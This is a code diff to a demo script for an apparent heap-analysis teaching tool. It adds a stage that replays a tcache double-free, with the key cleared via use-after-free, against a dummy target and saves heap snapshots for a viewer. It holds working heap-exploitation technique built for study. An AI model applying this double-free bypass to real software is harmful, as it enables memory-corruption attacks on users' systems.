@@ -21,10 +21,18 @@ Stages:
   3. the bypass       - defeating the tcache double-free check, and seeing it
   4. leak assertion   - proving an offset against ground truth
   5. layout snapshots - catching environment drift before it bites
+
+Pass --snapshots DIR to add a sixth pass that replays the whole double-free
+sequence and saves a heap snapshot at every step, which is what the browser
+viewer draws:
+
+    python3 examples/demo.py --snapshots stages/
+    heapscope view stages/
 """
 
 from __future__ import annotations
 
+import argparse
 import os
 import struct
 import sys
@@ -32,7 +40,7 @@ import tempfile
 
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 
-from heapscope import LayoutSnapshot, Probe, ProcessDied  # noqa: E402
+from heapscope import HeapSnapshot, LayoutSnapshot, Probe, ProcessDied  # noqa: E402
 
 P64 = lambda x: struct.pack("<Q", x & 0xFFFFFFFFFFFFFFFF)
 
@@ -246,7 +254,59 @@ def stage_5_snapshot() -> None:
             os.unlink(path)
 
 
-def main() -> int:
+def stage_6_timeline(directory: str) -> None:
+    """Replay the double-free sequence, saving a snapshot at every step.
+
+    This is the input for `heapscope view`. Watching the tcache bin go from 0
+    to 1 to 2 and then hand the same chunk out twice is a lot clearer as a
+    picture than as three lines of diff text.
+    """
+    banner("6. snapshot timeline - for the viewer")
+    os.makedirs(directory, exist_ok=True)
+    written = []
+
+    with DummyProbe([TARGET]) as p:
+        p.start()
+
+        def record(label: str) -> None:
+            path = os.path.join(directory, "%02d.json" % (len(written) + 1))
+            HeapSnapshot.capture(p, label=label).save(path)
+            written.append(path)
+            print("   %s  %s" % (os.path.basename(path), label))
+
+        record("start")
+
+        p.alloc(0, 0x60, b"A" * 0x60)
+        record("alloc(0, 0x60)")
+
+        p.alloc(1, 0x60, b"B" * 0x60)
+        record("alloc(1, 0x60)")
+
+        p.free(0)
+        record("free(0)")
+
+        p.edit(0, P64(0) + P64(0), size=0x60)
+        record("edit(0), key cleared through the UAF")
+
+        p.free(0)
+        record("free(0) again, chunk is in the bin twice")
+
+        p.alloc(0, 0x60, b"C" * 0x60)
+        record("alloc(0), pops the cycle")
+
+        p.alloc(1, 0x60, b"D" * 0x60)
+        record("alloc(1), the same chunk again")
+
+    print("\n%d snapshots written to %s" % (len(written), directory))
+    print("view them with:  heapscope view %s" % directory)
+
+
+def main(argv=None) -> int:
+    parser = argparse.ArgumentParser(description="A tour of heapscope.")
+    parser.add_argument("--snapshots", metavar="DIR",
+                        help="also write a snapshot timeline to DIR, for `heapscope view`")
+    args = parser.parse_args(argv)
+
     if not os.path.exists(TARGET):
         print("error: %s not found" % TARGET, file=sys.stderr)
         print("build it first:  cd examples/dummy && make", file=sys.stderr)
@@ -257,6 +317,8 @@ def main() -> int:
     stage_3_bypass()
     stage_4_leak()
     stage_5_snapshot()
+    if args.snapshots:
+        stage_6_timeline(args.snapshots)
     return 0
 
 
